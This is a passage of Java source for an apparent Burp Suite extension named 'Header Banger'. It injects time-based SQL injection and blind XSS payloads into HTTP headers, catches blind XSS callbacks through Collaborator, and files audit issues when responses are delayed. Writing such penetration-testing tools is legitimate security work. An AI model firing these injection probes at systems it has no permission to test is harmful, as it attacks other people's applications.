                        modifiedHeaders.set(i, HttpHeader.httpHeader(sensitiveHeader, finalPayload));
                        headerFoundAndReplaced = true;
                        break;
                    }
                }
                if (!headerFoundAndReplaced) {
                    modifiedHeaders.add(HttpHeader.httpHeader(sensitiveHeader, finalPayload));
                }
            }
            
            // Add extra headers
            HttpRequest finalRequest = originalRequest.withUpdatedHeaders(addOrReplaceHeaders(modifiedHeaders, extraHeaders));
            
            api.logging().logToOutput("Sending sensitive headers request with " + sensitiveHeaders.size() + " sensitive headers");
            api.logging().logToOutput("Total payloads in map after sensitive headers: " + payloadMap.size());
            
            // Send and forget, collaborator will catch it
            api.http().sendRequest(finalRequest);
            return;
        }
        
        api.logging().logToOutput("Processing SQL injection for sensitive headers");
        
        // SQL injection logic for sensitive headers
        List<String> headersToAdd = new ArrayList<>();
        
        // Add sensitive headers with payloads
        for (String sensitiveHeader : sensitiveHeaders) {
            headersToAdd.add(sensitiveHeader + ": " + hostValue + sqliPayload);
        }

        // Add extra headers
        headersToAdd.addAll(extraHeaders);

        List<HttpHeader> newHeaders = addOrReplaceHeaders(originalRequest.headers(), headersToAdd);
        HttpRequest modifiedRequest = originalRequest.withUpdatedHeaders(newHeaders);
        
        try {
            long startTime = System.currentTimeMillis();
            HttpRequestResponse response = api.http().sendRequest(modifiedRequest);
            long endTime = System.currentTimeMillis();
            long responseTime = endTime - startTime;

            api.logging().logToOutput("Sensitive headers SQL injection response time: " + responseTime + " ms");

            if (responseTime >= sqliSleepTime * 1000) {
                createSensitiveHeaderSqlIssue(response, responseTime);
            }
        } catch (Exception e) {
            api.logging().logToError("Error sending sensitive headers request: " + e.getMessage());
        }
    }

    private void createSqlInjectionIssue(InterceptedResponse interceptedResponse, long responseTime) {
        api.logging().logToOutput("POSSIBLE SQL INJECTION DETECTED!");
        api.logging().logToOutput("═══════════════════════════════════════════════════════════");
        api.logging().logToOutput("Attack Vector: SQL injection via regular headers");
        api.logging().logToOutput("  • URL: " + interceptedResponse.request().url());
        api.logging().logToOutput("  • Response Time: " + responseTime + " ms");
        api.logging().logToOutput("  • Expected Sleep Time: " + sqliSleepTime + " seconds");
        api.logging().logToOutput("Detected: " + new java.util.Date());
        
        // Create proper audit issue
        try {
            createAuditIssue(
                "Time-based SQL Injection via Headers",
                "Time-based SQL injection vulnerability detected through header injection. The application "
                + "responded with a delay of " + responseTime + " ms, which suggests that the injected "
                + "time-based SQL payload was executed. This indicates that user input is being directly "
                + "incorporated into SQL queries without proper sanitization.",
                interceptedResponse.request().url(),
                AuditIssueSeverity.HIGH,
                AuditIssueConfidence.FIRM
            );
        } catch (Exception e) {
            api.logging().logToError("Failed to create SQL injection audit issue: " + e.getMessage());
        }
        
        api.logging().logToOutput("═══════════════════════════════════════════════════════════");
    }

    private void createSensitiveHeaderSqlIssue(HttpRequestResponse response, long responseTime) {
        api.logging().logToOutput("POSSIBLE SQL INJECTION VIA SENSITIVE HEADERS DETECTED!");
        api.logging().logToOutput("═══════════════════════════════════════════════════════════");
        api.logging().logToOutput("Attack Vector: SQL injection via sensitive headers");
        api.logging().logToOutput("  • URL: " + response.request().url());
        api.logging().logToOutput("  • Response Time: " + responseTime + " ms");
        api.logging().logToOutput("  • Expected Sleep Time: " + sqliSleepTime + " seconds");
        api.logging().logToOutput("Detected: " + new java.util.Date());
        
        // Create proper audit issue
        try {
            createAuditIssue(
                "Time-based SQL Injection via Sensitive Headers",
                "Time-based SQL injection vulnerability detected through sensitive header injection. The application "
                + "responded with a delay of " + responseTime + " ms, which suggests that the injected "
                + "time-based SQL payload was executed. This indicates that user input from sensitive headers is being "
                + "directly incorporated into SQL queries without proper sanitization.",
                response.request().url(),
                AuditIssueSeverity.HIGH,
                AuditIssueConfidence.FIRM
            );
        } catch (Exception e) {
            api.logging().logToError("Failed to create SQL injection audit issue: " + e.getMessage());
        }
        
        api.logging().logToOutput("═══════════════════════════════════════════════════════════");
    }

    // ActiveScanCheck implementation
    @Override
    public String checkName() {
        return "Header Banger";
    }

    @Override
    public AuditResult doCheck(HttpRequestResponse baseRequestResponse, AuditInsertionPoint auditInsertionPoint, Http http) {
        return auditResult(emptyList()); // We handle scanning through proxy
    }

    @Override
    public AuditResult doCheck(HttpRequestResponse baseRequestResponse) {
        return auditResult(emptyList()); // We handle scanning through proxy
    }

    @Override
    public ConsolidationAction consolidateIssues(AuditIssue existingIssue, AuditIssue newIssue) {
        return KEEP_EXISTING; // Keep the existing issue
    }

    // ContextMenuItemsProvider implementation
    @Override
    public List<Component> provideMenuItems(ContextMenuEvent event) {
        List<Component> menuItems = new ArrayList<>();
        
        JMenuItem scanItem = new JMenuItem("Scan this request with Header Banger");
        scanItem.addActionListener(_ -> scanSelectedRequest(event));
        menuItems.add(scanItem);
        
        JMenuItem excludeHostItem = new JMenuItem("Exclude Host from Header Banger scans");
        excludeHostItem.addActionListener(_ -> excludeHostFromScans(event));
        menuItems.add(excludeHostItem);
        
        return menuItems;
    }

    private void scanSelectedRequest(ContextMenuEvent event) {
        Optional<HttpRequestResponse> selectedMessage = event.selectedRequestResponses().stream().findFirst();
        if (selectedMessage.isPresent()) {
            api.logging().logToOutput("Context menu scan initiated for: " + selectedMessage.get().request().url());
            
            // Create a simplified sensitive headers scan for context menu
            scheduler.execute(() -> {
                HttpRequest originalRequest = selectedMessage.get().request();
                String hostValue = getHeaderValue(originalRequest.headers(), "Host");
                
                if (hostValue != null) {
                    if (attackMode == 2) {
                        api.logging().logToOutput("Context menu: Processing BXSS for sensitive headers");
                        
                        // BXSS logic for context menu
                        List<HttpHeader> modifiedHeaders = new ArrayList<>(originalRequest.headers());
                        
                        for (String sensitiveHeader : sensitiveHeaders) {
                            CollaboratorPayload collabPayload = collaboratorClient.generatePayload();
                            String payloadDomain = collabPayload.toString();
                            String finalPayload = hostValue + bxssPayload.replace("{{collaborator}}", payloadDomain);
                            
                            // Store correlation for this payload
                            PayloadCorrelation correlation = new PayloadCorrelation(originalRequest.url(), sensitiveHeader, originalRequest.method());
                            payloadMap.put(payloadDomain, correlation);
                            
                            api.logging().logToOutput("Context menu: Added payload to map: " + payloadDomain + " -> " + sensitiveHeader);
                            
                            // Add or replace the sensitive header
                            boolean headerFoundAndReplaced = false;
                            for (int i = 0; i < modifiedHeaders.size(); i++) {
                                if (modifiedHeaders.get(i).name().equalsIgnoreCase(sensitiveHeader)) {
                                    modifiedHeaders.set(i, HttpHeader.httpHeader(sensitiveHeader, finalPayload));
                                    headerFoundAndReplaced = true;
                                    break;
                                }
                            }
                            if (!headerFoundAndReplaced) {
                                modifiedHeaders.add(HttpHeader.httpHeader(sensitiveHeader, finalPayload));
                            }
                        }
                        
                        // Add extra headers
                        HttpRequest finalRequest = originalRequest.withUpdatedHeaders(addOrReplaceHeaders(modifiedHeaders, extraHeaders));
                        
                        api.logging().logToOutput("Context menu: Sending request with " + sensitiveHeaders.size() + " sensitive headers");
                        api.logging().logToOutput("Context menu: Total payloads in map: " + payloadMap.size());
                        
                        api.http().sendRequest(finalRequest);
                        api.logging().logToOutput("Context menu scan: Sent BXSS probes for sensitive headers for URL: " + originalRequest.url());
                        return;
                    }

                    api.logging().logToOutput("Context menu: Processing SQL injection for sensitive headers");
                    
                    // SQLi logic for sensitive headers
                    List<String> headersToAdd = new ArrayList<>();
                    
                    for (String sensitiveHeader : sensitiveHeaders) {
                        headersToAdd.add(sensitiveHeader + ": " + hostValue + sqliPayload);
                    }
                    
                    headersToAdd.addAll(extraHeaders);
                    
                    List<HttpHeader> newHeaders = addOrReplaceHeaders(originalRequest.headers(), headersToAdd);
                    HttpRequest modifiedRequest = originalRequest.withUpdatedHeaders(newHeaders);
                    
                    try {
                        long startTime = System.currentTimeMillis();
                        HttpRequestResponse response = api.http().sendRequest(modifiedRequest);
                        long endTime = System.currentTimeMillis();
                        long responseTime = endTime - startTime;
                        
                        if (responseTime >= sqliSleepTime * 1000) {
                            api.logging().logToOutput("Context menu scan: Possible Blind SQL Injection detected! Response time: " + responseTime + " ms at URL: " + originalRequest.url());
                            createSensitiveHeaderSqlIssue(response, responseTime);
                        } else {
                            api.logging().logToOutput("Context menu scan: Request completed in " + responseTime + " ms for URL: " + originalRequest.url());
                        }
                    } catch (Exception e) {
                        api.logging().logToError("Error in context menu scan: " + e.getMessage());
                    }
                } else {
                    api.logging().logToOutput("Context menu: No Host header found for " + originalRequest.url());
                }
            });
        }
    }

    private void excludeHostFromScans(ContextMenuEvent event) {
        Optional<HttpRequestResponse> selectedMessage = event.selectedRequestResponses().stream().findFirst();
        if (selectedMessage.isPresent()) {
            String host = selectedMessage.get().request().httpService().host();
            if (!skipHosts.contains(host)) {
                skipHosts.add(host);
                saveSettings();
                api.logging().logToOutput("Host " + host + " added to the exclusion list");
            } else {
                api.logging().logToOutput("Host " + host + " is already in the exclusion list");
            }
        }
    }
}

